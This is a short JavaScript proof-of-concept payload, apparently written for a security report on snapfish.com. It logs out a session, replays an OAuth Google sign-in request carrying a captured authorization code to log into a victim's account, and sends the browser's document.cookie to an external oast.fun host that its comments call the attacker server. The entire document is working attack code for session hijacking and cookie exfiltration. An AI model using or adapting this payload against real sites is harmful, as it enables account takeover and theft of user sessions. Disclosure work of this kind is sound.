//Logout Attacker's Account
navigator.sendBeacon("https://www.snapfish.com/logout","");
alert("LOGOUT");

//Login to Victim's Account using oAuth Login
navigator.sendBeacon("https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=527231285582946&next=https%3A%2F%2Fwww.snapfish.com%2Fhome&SubscriptionFlag=ALL","");
alert("LOGIN GOOGLE");

//Send cookie to Attacker Server
var link="https://dmftkmghscwxjulluncuqmho9x6l6ujkt.oast.fun/VictimCookies="+document.cookie;
navigator.sendBeacon(link,"");

